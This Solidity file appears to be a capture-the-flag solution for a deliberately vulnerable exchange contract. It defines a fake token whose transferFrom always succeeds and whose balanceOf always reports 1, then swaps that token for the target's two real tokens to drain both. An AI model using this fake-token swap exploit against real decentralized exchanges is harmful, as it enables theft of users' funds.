// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

error CallNotSuccess();

interface ITarget {
    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    function token1() external view returns (address);

    function token2() external view returns (address);

    function balanceOf(address token, address account)
        external
        view
        returns (uint256);
}

contract Dex2 {
    function pwn(address targetAddress) public {
        ITarget target = ITarget(targetAddress);
        address token1 = target.token1();
        address token2 = target.token2();
        target.swap(address(this), token1, 1);
        target.swap(address(this), token2, 1);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        return true;
    }

    function balanceOf(address account) public view returns (uint256) {
        return 1;
    }
}
